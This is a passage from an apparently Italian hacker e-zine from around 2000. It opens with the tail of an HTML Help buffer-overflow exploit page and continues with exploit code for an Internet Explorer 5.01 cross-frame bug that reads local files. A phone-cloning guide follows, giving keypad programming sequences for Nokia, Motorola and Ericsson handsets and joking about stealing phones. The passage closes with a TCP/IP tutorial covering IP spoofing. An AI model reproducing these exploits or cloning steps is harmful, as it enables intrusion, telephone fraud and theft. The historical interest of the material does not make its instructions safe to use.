"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
a = a + Chr(240) + Chr(103) + Chr(233) + Chr(118)
b = String(10, Chr(&H90))
c = hhopen1.openhelp(a, b)

</script>
</body>
</html>


---- TEST.HTM - CUT HERE ----

------------------------------------------------------------------------------

Questo bug e' stato scoperto nei primi giorni di Giugno 2000 ed e' una
vulnerabilita' di IE 5.01 usando il controllo WebBrowser e IFRAME.
Il bug e' stato scoperto da Georgi Guninski.

Descrizione:
Internet Explorer 5.01 sotto Windows 98 (anche le altre versioni sono
vulnerabili) permette i cosiddetti "Cross frame" accedendo al DOM
dei documenti usando JavaScript, IFRAME e il controllo WebBrowser.
Cio' apre molti rischi di sicurezza. Infatti permette di leggere i file
locali, leggere file da ogni host, window spoofing, prendere i cookies, ecc.

Dettagli:

Il problema consiste nell'evento NavigateComplete2, che passa un argomento
al controllo WebBrowser. Il suddetto controllo ha una proprieta' accessibile
"document" che permette l'accesso al DOM del documento target.
Vediamo il codice che sfrutta questo bug:

------frame2.html--------------------------------
<IFRAME  ID="I1"></IFRAME>
<SCRIPT for=I1 event="NavigateComplete2(b)">
alert("Here is your file:\n"+b.document.body.innerText);
</SCRIPT>
<SCRIPT>
I1.navigate("file://c:/test.txt");
setTimeout('I1.navigate("file://c:/test.txt")',1000);
</SCRIPT>

------------------------------------------------------------------------------

Beh i bug non sono finiti, ce ne sono molti altri, che non mi apprestero'
a mostrarvi perche' sono stanco...;) A parte gli scherzi vi bastano alcune
ricerche su dei siti di sicurezza per trovarne altri. Credo che gia' 5 bug
in un browser siano molti per assicurare la sicurezza, quindi per navigare
tranquilli ci sono due soluzioni: o usare Linux (ehm) o un browser Netscape.
P.S. Non e' che questi due siano esenti da bug, ma rappresentano meglio
la sicurezza soprattutto contro chi e' avverso ai prodotti M$

                                                                T0rment0



[############################################################################]
[------------------------------] PhreakinG [---------------------------------]
[############################################################################]

               ===============================================
                     GUIDA ALLA CLONAZIONE DEI CELLULARI
               ===============================================

Avete un telefono Nokia, Motorola o Ericsson ?
In questa semplice guida vi esplichero' alcune caratteristiche per effettuare
la clonazione di uno di questi modelli.
Inizio dicendovi che non sempre la clonazione ha esiti positivi, quindi e'
meglio che utilizzate un cellulare secondario ovvero che avete acquistato
(o rubato) per poche migliaia di lire.
Per clonare un cellulare avrete bisogno delle seguenti informazioni:

a) IL SYSTEM ID
b) L'AREA CODE
c) IL NUMERO DEL CELLULARE

IL SYSTEM ID
Per iniziare bene dovrete conoscere il numero SYSTEM ID dell'area in cui vi
trovate, cio' si puo' fare in diversi modi:
a) Potete chiamare il vostro fornitore di servizi e inventarsi delle domande
che prevedono come risposta il SYSTEM ID.
b) Un altro modo e' quello di scoprirlo attraverso la programmazione di un
telefono che abbia un contratto o una scheda attiva.

L'AREA CODE
Se non conoscete il codice dell'area in cui risiedete state 'nguaiati! Cmq
dovrebbe essere un numero di 3 cifre

NUMERO DEL CELLULARE DA CLONARE
Questo e' ovvio! Non voglio nemmeno spiegarvelo!

Dopo aver dedotto queste informazioni, siete pronti a clonare il vostro primo
cellulare. Le informazioni trattate in seguito riguarderanno i cellulari
dalle marche popolari come:
NOKIA
MOTOROLA
ERICSSON
Queste sono le piu' popolari, se non avete una di queste 3 non disperatevi!
Andate dal vostro miglior amico (miglior effetto!) che ha un cellulare di una
delle marche sopra nominate, ditegli che sapete come ricaricargli la scheda,
ed una volta portato a casa non glielo ridate piu'! ;)
Ah, dimenticavo! Non aspettatevi che clonate subito il vostro cell. , a volte
puo' essere anche molto complicato.
              

PROGRAMMAZIONE DEI NOKIA

La Nokia e' senz'altro una delle marche piu' note oggi, ed e' per questo che
verra' trattata per prima ! (Anche perche' il mio cell. e' un Nokia...ehm! ;)

PER I NOKIA
21XX,51XX,61XX,636,639,918

PASSI DA COMPIERE
1)Accendete il telefono (oh pazza!)
2)Premete *#639#
3)Inserite le cifre del numero di cellulare da clonare
4)Inserite il SYSTEM ID, e premete OK
5) Il telefono si autospegnera' e si riaccendera'
Se quando si accendera' vi apparira' la scritta "Attivazione Fallita!"
significa che il telefono e' stato programmato male.

PER I NOKIA
P1000/100/PT101/PT128/PT228/PT232

PASSI DA COMPIERE
1)Accendete il telefono (oh pazzona!) 
2)Premete *3001#12345
3)Sul display appare 00
4)Premete CLR per alcuni secondi poi inserite il numero del cellulare,
premete memorizza,02,memorizza(STOre),e CLR(per alcuni secondi)
5)Inserite il SYSTEM ID
6)Premete *1*10333*05*05, poi memorizza
7)Premete 03, poi memorizza
8)Premete CLR
9)Spegnete il cell. per uscire e salvate la programmazione

PER I NOKIA
232/239/515

PASSI DA COMPIERE
1)Inserite *3001#12345 , poi STO 00
2)Premete CLR (ascolterete 2 beep)
3)Inserite 911#5551212#0 * 12345, STO, 01, STO
4)Premete CLR (ascolterete 2 beep)
5)Inserite il codice AREA CODE + il numero di cellulare, premete STO, 02, STO
e inserite il SYSTEM ID
6)Premete CLR (ascolterete 2 beep)
7)Premete *1*1 *333*15*05# 0111 * 1 ,STO, 03, STO
8)Premete CLR (ascolterete 2 beep)
9)Spegnete ed accendete il telefono


PROGRAMMAZIONE AVANZATA DEL NAM E TEST MODE PER I NOKIA
51XX, 61XX
Inserite sullo schermo *3001#12345#
Questo vi fara' apparire delle opzioni segrete che appartengono alla
programmazione avanzata del Nokia.
Per uscire basta spegnere il telefonino

PROGRAMMAZIONE DEI MOTOROLA

PASSI DA COMPIERE
1)Premete FCN, poi 0000000000000 (13 zero)
2)Premete RCL (il telefono vi mostrera' la scritta "01")
3)Inserite il SYSTEM ID e premete **
4)Inserite l'Area Code e premete **
5)Inserite il numero del cellulare e premete **
6)Inserite 05 e premete **
7)Inserite 0 piu' il penultimo numero del numero del cellulare e premete **
8)Inserite 05 e premete **
9)Inserite 000000 e premete **
10)Inserite 123 e premete **
11)Inserite 0333 e premete **
12)Premete **
A questo punto premete # o RCL per confermare e la programmazione e' completa!

PER I MOTOROLA STARTAC
60** - 30** - 70 - 90 - DIDGITAL

PASSI DA COMPIERE
-Inserite 7,4,6,6,3
-Inserite il numero di cellulare
-Premete STO
-Inserite il SYSTEM ID
-Premete STO

Programmazione completa!

PROGRAMMAZIONE DEGLI ERICCSON

PER GLI ERICSSON
318/368/388/618/688

PASSI DA COMPIERE:
1)Premete 923885, poi il tasto MENU
2)Premete 1 
3)Premete RCL
4)Inserite il numero del cellulare, premete RCL
5)Premete RCL
6)Inserite il SYSTEM ID POI RCL
7)Premete RCL
8)Codice 0000, premete RCL
9)Andate al livello 2, premete NO
10)EXIT (salvare)(Premete YES)
11)Premete MENU
12)Premete 3
13)Premete 2

SE AVETE AVUTO DEI PROBLEMI E SI E' BLOCCATO IL TELEFONO NON VI PROCCUPATE,
COSTRUITEVI UN BEL CAVETTO DI INTERLACCIAMENTO TRA IL CELL. E IL PC,
VI SCARICATE IL SOFTWARE DI PROGRAMMAZIONE DEL VOSTRO CELLULARE E FATE
IL PROCEDIMENTO DI UNLOCK O DI CLONAZIONE DAL VOSTRO PC.

                                                                NetMaster

[############################################################################]
[-------------------------------] TheorY [-----------------------------------]
[############################################################################]


     [ Inside TCP/IP ].
     a x-brainless guide to tcp/ip.
     by nEMBO[K] - i.am/nembokid
     nembokid@crosswinds.net


/*

 *  No Copyright (C) 2000 nEMBO[K]

 *  This software is free sofware; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2, or (at your option) 
    any later version. 
 *
    This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details. 
 
 */


[=-------------------------------------------------------------------------=]


nembok@donets:~$ cat inside.tcpip >> /dev/brain

     Il testo seguente vuole essere una guida per quanto riguarda alcuni
 protocolli usati in internet, con uno sguardo particolare al tcp/ip e
 ad alcune sue debolezze. 

     Non vuole essere un' opera omnia, modello Appunti Linux , e nemmeno
 vuole sostituirsi a nessun testo serio , come "TCP/IP Illustrated" 
 e simili. Assolutamente no. Ma potrebbe essere un buon punto di inizio
 per chi vuole capire la rete e il tcp/ip.
    Qualcuno potrebbe trovarla utile per chiarirsi il networking
 e per avere una infarinatura su concetti come la dinamica di
 funzionamento dei pacchetti o sapere che protocollo usa per mandare 
 la posta e quale per lavorare in remoto. Ad ogni modo, qualunque sia 
 l'uso che ne facciate, non sara' poi tanto dannoso per la vostra mente.

    Insomma, che volete... qualche cosa la dovevo pur scrivere su 
 questa e-zine ;P [ X-brain, che mi fai passare.]
  
                                                         Enjoy,
                                                        nEMBO[K]

[ Piccola N.B. ]
Per evitare confusione, quando nel testo si trovano le espressioni
"dall'altro lato" o "dall'altra parte" si intende l'altro lato della
connessione che avviene tra due host. Per "macchina" si intende un 
computer, non la ferrari :P Per "ottetti" si intendono gruppi di 8 bit.
Le "RFC" sono le Request For Comments, testi disponibili su internet che
spiegano specifiche procedure che si usano sulla rete.

[=-------------------------------------------------------------------------=]

----[ Indice ]

1.1 - Concetti Base sul Networking.

  1.2 - Introduzione ai protocolli 

2.1 - TCP/IP in generale

  2.2 - TCP - TCP header

  2.3 - IP - IP header

3.1 - Alcune Debolezze del TCP/IP

  3.2 - IP Spoofing

  3.3 - Blind TCP Spoofing

  3.4 - Hijacking

  3.5 - DoS

[=-------------------------------------------------------------------------=]


----[ 1.1 ]----[ Concetti base sul Networking. ]

     Nella notte dei tempi, tanto tempo fa, quando ancora Paolo
 Bonolis faceva Bim Bum Bam e Mitch di Baywatch faceva SuperCar,
 vabbe'...facciamo i seri... 

-:- mode/#bo0zed [+serio nEMBO[K]] by nEMBO[K]

     Sin dalla sua nascita ,l'uomo, ha tentato di comunicare in ogni
 modo...tentava di comunicare con gesti,poi con parole , poi col
 telefono...e  col computer. 
 Ogni volta che usiamo la parola per comunicare ad un altra persona
 il nostro pensiero, noi mettiamo in atto una dinamica di "networking",
 di scambio di informazioni. Lo scambio di informazioni avviene tramite
 un linguaggio comune. Se il linguaggio non fosse comune e comprensibile
 da entrambe le parti coinvolte lo scambio sarebbe impossibile. Quando si
 parla di computer e networking di solito il linguaggio comune va sotto
 il nome di "protocollo". C'e' un protocollo per tutto. Il computer lo usa
 per scambiare informazioni con altri computer o unita', detti hosts.

 In generale si definisce "network" un insieme di due o piu' unita' in
 grado di scambiare informazioni. Internet e' un insieme di network. Nulla
 di piu'. Una grande e immensa rete di network. Arpanet, NSFnet, reti
 universitarie, Fidonet, Micionet..e chi piu' ne ha piu'ne metta...insieme
 formano "Internet". E' bene chiarire in questo contesto la differenza
 tra LAN, MAN e WAN. LAN [ Local Area Network ] e' una rete contenuta
 che ha dimensioni ridotte...spesso non supera un edificio. MAN
 [ Metropolitan Area Network ] e' un insieme di piu' LAN , e non
 supera di solito il territorio di una citta'. WAN [ Wide Area Network ]
 e' un insieme di LAN e MAN e si estende per molto piu' di un edificio
 o di una citta'. 


----[ 1.2 ]----[ Introduzione ai Protocolli. ]

TCP e IP sono due protocolli che fanno parte della famiglia di protocolli
di internet. Ciononostante oggi per TCP/IP si intende il protocollo sul
quale si BASA Internet. Questo e' vero in parte. TCP e IP vengono usati
insieme nella stragrande maggioranza dei casi, ma non sono sempre alla
base dei servizi che internet ci mette a disposizione. 

Prima che fosse introdotto il TCP/IP , nel 1977 le macchine Unix
comunicavano tramite il protocollo UUCP [ Unix-to-Unix-CoPy ]. Questo
protocollo permetteva di copiare interi file lungo linee seriali, ed era
originariamente pensato solo per macchine Unix. Includeva l'invio di email
e la stampa in remoto. Era pensato per connessioni non permanenti e
utilizzava una banda molto ristretta. Permetteva di inoltrare delle azioni
a posteriori. Cioe' permetteva di effettuare operazioni SE e quando
l'altra macchina si sarebbe connessa. Ad esempio supponiamo di voler
stampare un file su di una macchina remota tramite UUCP. La sintassi
sarebbe: 

$ uux -r nembok!lpr !pamela.jpg

Fa si che uux [ un comando che usa UUCP ] tenga in memoria un processo per
la macchina nembok, in questo caso di stampa del file pamela.jpg. Il flag
-r fa in modo che la richiesta non sia subito inoltrata al sistema, ma
aspetti una successiva connessione. Questo e' chiamato "spooling".  Il
processo potrebbe anche coinvolgere piu' nodi, piu' macchine.  Quella di
permettere che l'informazione passi per piu' host e' una caratteristica
del protocollo UUCP. Per questa caratteristica UUCP e' usato oggi
maggiormente per le email e per le news. Fateci caso, negli header dei
newsgroup o quando copiate le mail remote sul vostro pc.

    Il TCP/IP affonda le sue radici in un progetto di ricerca dell'
Americana DARPA [ Defense Advanced Research Projects Agency ], nel 1969.
   Dopo esperimenti portati a termine con successo, TCP/IP diventa nel 
1983 uno standard. Questa serie di protocolli offrono molti servizi, 
vediamo ora i piu' importanti: 

./ trasferimento dei file - File Transfer Protocol [ FTP ] Consente il
   trasferimento completo di file da una macchina ad un altra.  E' piu'
   utile usarlo quando si deve copiare un file oltre una piccola LAN. La 
   sicurezza e' - relativamente - garantita da un login dell'utente con 
   userid e password. L'utente cioe' deve avere un account sulla macchina 
   dalla quale vuole prendere il file, o usare l'account di qualcun altro. 

./ login remoto - Network Terminal Protocol [ TELNET ] Tramite questo
   protocollo chiunque puo' effettuare un login su un computer che e'
   situato anche all'altro capo del mondo e usarlo come se fisicamente
   fosse li', all'altro capo del mondo. I comandi sono dati da locale ma 
   di fatto il controllo della macchina remota e' lo stesso. 

./ posta - Simple Mail Transfer Protocol [ SMTP ] Permette di mandare
   posta ad utenti di altri computer. Semplicemente si copiano le mail 
   remote sul normale file di mail di un utente. 

La molteplicita' di servizi ha poi portato alla struttura "server/client" 
un computer cioe' chiamera' un altro computer sulla rete per un
determinato servizio. Il Server e' la macchina che offre il servizio, Il
Client e' colui che attinge dal Server. La cosa bella di questa struttura
e' che Server e Client possono benissimo girare sulla stessa macchina.
Segue una lista di alcuni servizi basati sul modello server/client. Da
notare che questi servizi possono funzionare senza il TCP/IP. 

./ network file system [ NFS ]. Tramite questo servizio e' possibile
  esportare vere e proprie porzioni di file system su altri computer. Il
  filesystem e' virtuale, un po' come si diceva prima per il telnet, ma di
  fatto e' come se si avesse un altro filesystem mountato sulla propria
  macchina. La finalita' e' bene o male quella dell'FTP, si condividono
  risorse, si scambiano file. Il NFS e'indicato nelle LAN dove, in questo
  modo , e' possibile fare il backup di un solo hard disk che, magari, e'
  condiviso tra piu' computer invece di fare il backup di ogni disco su
  ogni singola macchina. 

./ stampa remota . Permette , in mancanza di una stampante locale, di
  stampare su macchine remote. Il protocollo maggiormente usato qui e' il
  remote lineprinter protocol, della Berkeley Unix. 

./ esecuzione remota . Permette di eseguire programmi su macchine remote.
  Questo e' utile quando si ha la necessita' di far funzionare programmi
  che richiedono una grande quantita' di risorse, ma non le si ha a 
  disposizione in locale. Esistono i sistemi di "remote procedure call" 
  [ RPC ] che permettono ad un programma di chiamare delle subroutine 
  su di un altro computer. Ci sono molti server di questo tipo, ricordiamo 
  pero' rsh ed rexec della Berkeley Unix. I protocolli piu' supportati 
  sembrano essere Xerox's Courier ed RPC della SUN. 

./ name servers . In una grande network, diventa ogni giorno piu' grande
  il numero di informazioni da gestire. Gli account, le password, i nomi e
  gli indirizzi delle network e cosi' via... Queste informazioni non sono 
  tenute su ogni computer, ma solo su una ristretta cerchia che funge appunto 
  da "name server", tiene memoria di tutte queste informazioni. Ogni computer
  poi potra' accedervi tramite la rete ogni volta che ce ne sara' bisogno. 

./ network window systems . Qualora ce ne fosse bisogno esiste un
  protocollo che permette la visualizzazione di grafici e/o permette
  comunque la gestione di immagini tramite computer in rete.  MIT's Athena
  e altri sono protocolli disegnati per questi servizi. Richiedono il
  TCP/IP. 

Se si desiderate altre informazioni sui protocolli attualmente in uso...
UDP, ICMP, IGMP, etc etc... date una occhiata alla RFC 1011. 


----[ 2.1 ]----[ TCP/IP in generale. ]


Mettiamo il caso che si debba mandare una email ad un nostro caro amico in
Patagonia. In questo caso sara' il protocollo SMTP ad entrare in azione. 
Quindi prima di tutto sara'il protocollo a dire chi e' il mittente del
messaggio, a chi e' destinato, quanto e' lungo ecc ecc...  Il protocollo
SMTP semplicemente e' composto da una serie di messaggi di questo genere.
Si presume che questi messaggi [ chi e' il mittente, a chi e' destinata
l'email ... ] passino lungo qualche cosa che faccia comunicare tra di loro
i computer. Qualcosa che permetta a questi dati di arrivare con una certo
ordine e in un certo modo. Ecco che entra in gioco il TCP. 
TCP sta per "Transfer Control Protocol". Esso si fara' carico di far 
arrivare tutte queste informazioni in modo ordinato e coerente. 
Se il messaggio e' troppo lungo si fara' carico di dividerlo in
piu' parti, e si fara' carico di far arrivare tutto il messaggio
correttamente, in ordine. Questi dati sono "sminuzzati" dal TCP, in 
sequenze dette "datagrams", che in italia preferiamo chiamare "pacchetti".

----[ N.B.: ]
[ Tecnicamente e' piu' giusto dire "datagram" poiche' i pacchetti a loro
volta possono contenere datagram. La differenza e' molto sottile. Un
datagram potrebbe essere contenuto in piu'pacchetti ...ma a noi non
interessa molto e quindi li chiamero' ,per il resto del testo e per una
maggiore comprensibilita', "pacchetti". ]

Facciamo un esempio. Mettiamo di voler mandare un file di 15000 ottetti 
al nostro amico in Patagonia. La maggior parte delle network non riesce 
a gestire un file di 15000 ottetti. Quindi il TCP lo sminuzzera' in 30
pacchetti da 500 . A questo punto ogni pacchetto verra' mandato a
destinazione indipendentemente dalla sequenza con la quale sono stati
spezzettati. La cosa buffa e' che fino a quando non arriveranno a
destinazione questi pacchetti saranno entita' distinte e separate e
verranno trattate di conseguenza. Cioe' il pacchetto 29 ,ad esempio, 
potrebbe arrivare benissimo prima del pacchetto 28 ..e cosi'via. Una volta
arrivati tutti a destinazione, i pacchetti saranno riassemblati nel file
originale di 15000 ottetti che sara' visto dal nostro amico in Patagonia.
Se uno dei pacchetti durante il tragitto dovesse sperdersi... dovra'
essere rinviato. 

Si puo' immaginare il TCP come una serie di operazioni che un computer
fa automaticamente ogni volta che chiama in causa un altro computer.  In
modo simile, il TCP usa l'IP come serie di operazioni ogni volta che ne ha
bisogno. Sia chiaro che il TCP ha bisogno dell'IP, ma non e'
necessariamente vero il contrario. Ci sono applicazioni che non hanno
bisogno del Transfer Control Protocol.  Questo modo di intendere le cose ,
a "livelli", a "strati" e' chiamato "layering". Ritornando all'esempio
precedente ,abbiamo 4 livelli, 4 "layers" [ di solito le applicazioni
tcp/ip ne hanno 4 ]: 

1: Il protocollo per una applicazione, come la posta.  
2: TCP che si fa carico del modo in cui distribuire i dati.  
3: IP che si occupa della destinazione dei pacchetti.  
4: Protocolli che servono a destreggiare le parti prettamente "fisiche" 
   della comunicazione, come una linea Point-to-Point o Ethernet. 

Per la struttura stessa di Internet, i pacchetti passeranno per una
dozzina di network differenti prima di arrivare a destinazione. 

----[ 2.2 ]-----[ TCP ]

Il TCP e' responsabile dello sminuzzamento dei dati in pacchetti, del
riassemblarli nel giusto ordine dall'altra parte, e di rimandare i
pacchetti eventualmente perduti. Sembra che faccia gran parte del lavoro.
Ma se i dati sono sminuzzati in pacchetti e ogni pacchetto parte dal mio 
modem , passa attraverso il mio provider, rimbalza su un router che lo 
manda ad un altro router che lo manda a destinazione...come fa ad arrivare 
il file ancora integro? la faccenda non e' tanto facile.
Viene qui in aiuto l'IP.
Il TCP semplicemente da all'IP il pacchetto da consegnare. E l'IP non sa
assolutamente se quel pacchetto fa parte di una SERIE di pacchetti o meno.
Per lui e' indifferente. Li manda solo alla loro destinazione.

Ora: sappiamo come vengono sminuzzati i pacchetti, e sappiamo come arrivano 
a destinazione. Ma come fa poi il TCP a sapere come riassemblare nel giusto 
ordine i pacchetti una volta arrivati? La soluzione e' negli "headers". 

Gli "Headers" sono semplicemente degli ottetti extra attaccati al pacchetto. 
Attualmente sono 20 ottetti, ma i piu' importanti sono quelli che contengono 
informazioni su una "porta di partenza" , una di "destinazione" e un "numero di
sequenza".

I numeri di porte sono assegnati per riuscire a tenere 
piu' processi figli in attivo. Mettiamo caso che 3 persone stiano
scaricando dal mio pc gli ultimi mp3 di Adriano Pappalardo, ad ognuno 
di loro saranno assegnate porte differenti, non la stessa porta a tutti e 3.

La porta di partenza [ source port ] e' assegnata quando si mandano dei
pacchetti. Lo stesso fara' l'host dall'altra parte, avra' una sua
propria source port, che nel nostro pacchetto uscente sara' la porta di
destinazione [ destination port ].
In piu' ogni pacchetto ha un Sequence Number,
che consente al TCP di riassemblare ogni pacchetto in ordine, cosi'
da ricostruire il file originale, e da capire anche che non manca 
nessun pacchetto all'appello.

Il TCP non numera i pacchetti, ma gli ottetti. Quindi se il primo
pacchetto ha 500 ottetti sara' numerato "0", il secondo "500", il
terzo "1000" etc etc...

Altro ottetto da considerare e' il "Checksum", un numero ottenuto
facendo la somma di tutti gli ottetti dei pacchetti. La somma ottenuta
viene poi messa a confronto col checksum che c'e' dall'altra parte, se
combaciano ok, altrimenti significa che s'e' perso qualche pacchetto o
qualcosa non va. E si scarta il pacchetto.

Questa e' la rappresentazione in ascii di quanto descritto finora.
            
              - Rappresenta l'header TCP del pacchetto -

   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                        Sequence Number                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Acknowledgment Number                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Data |           |U|A|P|R|S|F|                               |
   | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
   |       |           |G|K|H|T|N|N|                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |           Checksum            |         Urgent Pointer        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                             data                              |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


"Acknowledgment Number" contiene il valore del prossimo "Sequence Number"
che chi ha mandato il pacchetto si aspetta di ricevere. Cioe' se mando un
pacchetto con Ack. Number 1500 significa che fino ad allora ho ricevuto 
tutti i pacchetti fino all'ottetto 1500.
Se chi manda i pacchetti non riceve un Ack. Number entro un certo limite
di tempo, il pacchetto viene rimandato.

"Window" contiene quanti dati possono essere mandati alla volta. Non
sarebbe una cosa buona mandare un pacchetto, aspettare la risposta di 
ricevuto pacchetto , e poi mandarne un altro. Il trasferimento non
finirebbe mai. D'altra parte non si puo' nemmeno mandare tutto
velocemente. Si rischierebbe di sovraccaricare la macchina. Da entrambe
le parti la macchina comunica l'ammontare di dati capace di assorbire
ancora, mettendo i numeri di ottetti nel campo "Window". Quando raggiunge
lo zero, chi manda i pacchetti deve smetterla. Una volta processati
i dati, da zero il numero cresce fino a far comprendere all'altro capo
del filo che si e' pronti a ricevere nuovi dati.

"Urgent Pointer" serve a far capire alla macchina che riceve i pacchetti
di saltare una certa serie di ottetti. 

----[ 2.3 ]----[ IP ]

IP sta per "Internet Protocol".
Il TCP dice all'IP dove deve indirizzare i pacchetti che ha costruito.
Questo e' tutto quello che fa l'IP. All'IP non gliene frega niente di cosa
c'e' nel pacchetto o nell'header TCP.
Per poter indirizzare il pacchetto ,l'IP a sua volta aggiunge un suo
header:

   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Source Address                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Destination Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Le cose importanti qui sono Source Address [ Indirizzo Sorgente ] e
Destination Address [ Indirizzo di Destinazione ] il "Protocol" number
e l' "Header Checksum". Gli indirizzi sono nella forma a 32-bit che
abbiamo visto prima [ 128.6.4.194 etc... ]. Il Source Internet Address 
e' l'indirizzo della macchina da cui parte il pacchetto. E' il campo
per capire da dove arriva il pacchetto. Internet Destination
Address e' l'indirizzo verso il quale si vuole mandare il pacchetto. E' 
indispensabile per instradare il pacchetto lungo la network. 
"Protocol" e' necessario per indicare al destinatario che deve maneggiare 
i pacchetti con l'apposito protocollo, che potrebbe essere TCP o un altro 
tipo. Il "Checksum" infine da sicurezza sull'integrita' dell'header.
"Flags" e "Fragment Offset" servono a tener traccia dei pacchetti anche se
in qualche caso essi dovessero essere ulteriormente frammentati. Cio'
capita in network che non riescono a gestire una certa quantita' di dati,
e quindi devono ulteriormente frammentare i pacchetti.
Il "Time To Live" e' un valore che diminuisce mano a mano che il pacchetto
passa di sistema in sistema. Quando arriva a zero, il pacchetto e'
_terminato_ , muore. Questo per evitare che il pacchetto continui a vagare
in loop infiniti e simili.

A questo punto, e' possibile che non siano piu' necessari altri headers.
I pacchetti sono portati al capolinea senza altre aggiunte.


----[ 3.1 ]----[ Alcune Debolezze del TCP/IP. ]

Col passare del tempo sono state trovate delle debolezze nel protocollo
TCP/IP e sono state piu' o meno sfruttate per scopi non sempre benefici.


----[ 3.2 ]----[ IP spoofing. ]

L'ip Spoofing e' un attacco che sfrutta il protocollo IP. Come abbiamo
visto, l'header IP contiene il Source Address e il Destination Address. Ai
fini pratici , e' importante solo il Destination Address. In determinate
condizioni e' possibile fare un header IP ad arte, con l'IP Source Address
che vogliamo noi. Sembrera' cosi' che il pacchetto venga da un host
diverso dal nostro. Questo e' un attacco usato sopratutto contro hosts
che accettano connessioni dolo da determinati "trusted hosts". Immaginiamo
che esista un ipotetico server "nembokid.donuts.net - di I.Address 123.4.5.6",
che accetti connessioni solo da un indirizzo: 123.4.5.7 . Costruendo un
header IP si puo' presentare questa condizione:
 
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   | Source:                  123.4.5.7                            |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   | Target:                  123.4.5.6                            |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Resto dell'header...                    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Sara' cosi' possibile "spoofare" il pacchetto in modo che SEMBRI venire
dall'host 123.4.5.7. Anche se noi in realta' non siamo e non abbiamo 
nulla a che fare con l'host 123.4.5.7

----[ 3.3 ]----[ Blind TCP Spoofing. ]

Lo spoofing alla cieca, la predizione del "Sequence Number" nell'header
TCP e' stato ampiamente trattato da T0rment0 nel primo numero di X-Brain.
Spiegarlo sarebbe solo ripetitivo. Se vi interessa, troverete maggiori
informazioni li'. [ de he hi ho, mi lavo le mani ].

Per maggiori informazioni sullo spoofing , leggete l'articolo di daemon9
 - route - su Phrack 48 [www.phrack.com]

